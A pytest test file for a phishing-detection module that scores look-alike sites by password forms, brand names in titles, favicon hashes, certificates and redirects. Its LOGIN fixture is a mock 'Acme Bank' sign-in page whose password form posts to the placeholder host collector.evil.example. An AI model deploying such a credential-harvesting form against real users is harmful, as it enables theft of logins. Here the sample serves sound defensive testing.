import base64
import hashlib
from datetime import datetime, timedelta, timezone

import pytest
from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.x509.oid import NameOID

from app.services import brand_probe_analysis as pa

NOW = datetime(2026, 10, 7, 12, 0, tzinfo=timezone.utc)


def make_cert(cn="acme-login.xyz", sans=("acme-login.xyz",), issuer="Let's Encrypt", self_signed=False, age_days=3, valid_days=90):
    key = ec.generate_private_key(ec.SECP256R1())
    subject = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, cn)])
    iss = subject if self_signed else x509.Name([x509.NameAttribute(NameOID.ORGANIZATION_NAME, issuer)])
    start = NOW - timedelta(days=age_days)
    b = x509.CertificateBuilder().subject_name(subject).issuer_name(iss).public_key(key.public_key()).serial_number(x509.random_serial_number()).not_valid_before(start).not_valid_after(start + timedelta(days=valid_days))
    if sans:
        b = b.add_extension(x509.SubjectAlternativeName([x509.DNSName(s) for s in sans]), critical=False)
    cert = b.sign(key, hashes.SHA256())
    return base64.b64encode(cert.public_bytes(serialization.Encoding.DER)).decode()


LOGIN = """<html><head><title>Acme Bank - Sign in</title></head><body>
<form action="https://collector.evil.example/post" method="post"><input type="text" name="u"><input type="password" name="p"></form>
<form action="/search"><input name="q"></form></body></html>"""


def result(html=LOGIN, chain=None, status=200, **kw):
    r = {"ok": True, "chain": chain or [{"url": "http://acme-login.xyz/", "status": 200}], "final_status": status, "content_type": "text/html", "html": html, "truncated": False}
    r.update(kw)
    return r


def run(res, **kw):
    a = dict(host="acme-login.xyz", official_domains=["acme.com"], brand_words=["acme"], brand_favicon_sha256=None)
    a.update(kw)
    return pa.analyse(res, **a)


def test_a_login_page_that_posts_to_another_site_is_found_with_the_brand_in_its_title():
    f = run(result())
    assert f["password_form"] and f["offsite_password_form"] and f["brand_in_title"] and f["title"] == "Acme Bank - Sign in"
    assert [x["password"] for x in f["forms"]] == [True, False] and f["forms"][0]["action_host"] == "collector.evil.example" and f["forms"][1]["offsite"] is False


def test_a_form_that_posts_to_its_own_domain_is_not_offsite():
    f = run(result("<form action='/login'><input type=password></form>"))
    assert f["password_form"] and not f["offsite_password_form"]
    assert not run(result("<form action='https://sub.acme-login.xyz/x'><input type=password></form>"))["offsite_password_form"]      # same registrable domain


def test_broken_hostile_and_empty_html_never_raise():
    for html in ("<form><input type=password", "<<<>>>", "", "<form " * 5000, "\x00" * 100, "<title>" + "x" * 100000):
        f = run(result(html))
        assert isinstance(f["forms"], list) and len(f["forms"]) <= pa.MAX_FORMS
    assert run(result(html=None))["forms"] == []


def test_a_redirect_to_the_brands_own_site_is_recognised_and_explains_the_rest_away():
    chain = [{"url": "http://acme-login.xyz/", "status": 301}, {"url": "https://www.acme.com/", "status": 200}]
    f = run(result("<form><input type=password></form>", chain=chain))
    assert f["redirects_to_brand"] and f["crosses_domain"] and f["redirects"]
    s = pa.signals(f)
    assert [x["signal"] for x in s] == ["page_redirects_to_brand"] and s[0]["weight"] < 0           # nothing else is added on top


def test_a_redirect_that_does_not_end_on_the_brand_is_not_a_defensive_redirect():
    f = run(result(chain=[{"url": "http://acme-login.xyz/", "status": 302}, {"url": "https://other.example/", "status": 200}]))
    assert f["crosses_domain"] and not f["redirects_to_brand"]


def test_favicon_match_is_byte_exact_and_only_when_both_exist():
    icon = b"\x89PNGfakeicon"
    sha = hashlib.sha256(icon).hexdigest()
    f = run(result(favicon_b64=base64.b64encode(icon).decode()), brand_favicon_sha256=sha)
    assert f["favicon_matches_brand"] and f["favicon_sha256"] == sha
    assert not run(result(favicon_b64=base64.b64encode(b"other").decode()), brand_favicon_sha256=sha)["favicon_matches_brand"]
    assert not run(result(favicon_b64=base64.b64encode(icon).decode()), brand_favicon_sha256=None)["favicon_matches_brand"]
    assert not run(result(favicon_b64="@@bad@@"), brand_favicon_sha256=sha)["favicon_matches_brand"]


def test_certificate_facts_and_name_matching_including_wildcards():
    c = pa.parse_certificate(make_cert(), "acme-login.xyz", now=NOW)
    assert c["valid_for_host"] and not c["self_signed"] and not c["expired"] and c["age_days"] == 3 and c["issuer"] == "Let's Encrypt" and len(c["sha256"]) == 64
    assert pa.parse_certificate(make_cert(sans=("*.acme-login.xyz",)), "www.acme-login.xyz", now=NOW)["valid_for_host"]
    assert not pa.parse_certificate(make_cert(sans=("*.acme-login.xyz",)), "a.b.acme-login.xyz", now=NOW)["valid_for_host"]       # a wildcard covers one label
    assert not pa.parse_certificate(make_cert(sans=("other.example",)), "acme-login.xyz", now=NOW)["valid_for_host"]
    assert pa.parse_certificate(make_cert(sans=(), cn="acme-login.xyz"), "acme-login.xyz", now=NOW)["valid_for_host"]                # falls back to the common name
    assert pa.parse_certificate(make_cert(self_signed=True), "acme-login.xyz", now=NOW)["self_signed"]
    assert pa.parse_certificate(make_cert(age_days=100, valid_days=90), "acme-login.xyz", now=NOW)["expired"]


def test_certificate_is_compared_with_the_ct_issuance_date_when_there_is_one():
    der = make_cert(age_days=3)
    near = (NOW - timedelta(days=3, hours=2)).isoformat()
    far = (NOW - timedelta(days=40)).isoformat()
    assert pa.parse_certificate(der, "acme-login.xyz", near, now=NOW)["matches_ct"] is True
    assert pa.parse_certificate(der, "acme-login.xyz", far, now=NOW)["matches_ct"] is False
    assert pa.parse_certificate(der, "acme-login.xyz", None, now=NOW)["matches_ct"] is None
    assert pa.parse_certificate(der, "acme-login.xyz", "garbage", now=NOW)["matches_ct"] is None


def test_garbage_certificates_return_none_not_an_exception():
    assert pa.parse_certificate(None, "h") is None and pa.parse_certificate("", "h") is None
    assert pa.parse_certificate(base64.b64encode(b"not a certificate").decode(), "h") is None
    assert pa.parse_certificate("###", "h") is None


@pytest.mark.parametrize("status,html,expected", [
    (403, "", True), (429, "", True), (503, "", True), (200, "<title>Just a moment...</title>", True), (200, "please solve the CAPTCHA", True),
    (200, "<html>ordinary</html>", False), (404, "<html>nope</html>", False),
])
def test_blocks_and_challenge_pages_are_flagged_so_they_are_never_read_as_clean(status, html, expected):
    assert run(result(html, status=status))["challenge_page"] is expected


def test_signals_for_a_phishing_looking_page_are_expert_weights_and_say_what_was_seen():
    der = make_cert(self_signed=True)
    icon = b"icon"
    sha = hashlib.sha256(icon).hexdigest()
    f = run(result(favicon_b64=base64.b64encode(icon).decode(), cert_der_b64=der), brand_favicon_sha256=sha)
    sigs = {s["signal"]: s for s in pa.signals(f)}
    assert set(sigs) == {"page_password_form", "page_brand_favicon", "page_certificate_odd"}
    assert sigs["page_password_form"]["weight"] == pa.W_PASSWORD_FORM + pa.W_OFFSITE_FORM + pa.W_BRAND_NAMED_PASSWORD
    assert "sends it to a different site" in sigs["page_password_form"]["summary"] and "brand's name" in sigs["page_password_form"]["summary"]
    assert sigs["page_brand_favicon"]["weight"] == pa.W_FAVICON_COPY and "self-signed" in sigs["page_certificate_odd"]["summary"]
    assert all(s["dimension"] == "abuse" for s in sigs.values())


def test_an_ordinary_page_adds_no_evidence_and_an_unreachable_one_adds_nothing_at_all():
    assert pa.signals(run(result("<html><title>Hello</title><p>hi</p></html>"))) == []
    assert pa.signals(run({"ok": False, "chain": [], "error": "could not connect"})) == [] and pa.signals(None) == []


def test_a_challenge_page_gets_a_zero_weight_note_not_a_clean_bill_of_health():
    s = pa.signals(run(result("<title>Just a moment...</title>", status=403)))
    assert [x["signal"] for x in s] == ["page_may_differ"] and s[0]["weight"] == 0 and "differ" in s[0]["summary"]


def test_the_raw_html_is_not_part_of_the_stored_facts():
    f = run(result("<form><input type=password></form><script>SECRET_MARKER</script>"))
    assert "SECRET_MARKER" not in str(f) and "html" not in f


def test_a_look_alike_that_is_itself_an_official_domain_is_not_a_defensive_redirect():
    chain = [{"url": "http://acme.com/", "status": 301}, {"url": "https://www.acme.com/", "status": 200}]
    assert not run(result(chain=chain), host="acme.com")["redirects_to_brand"]


def test_an_unreachable_probe_yields_no_evidence_even_if_stray_fields_are_present():
    assert pa.signals({"reachable": False, "password_form": True, "offsite_password_form": True, "favicon_matches_brand": True}) == []
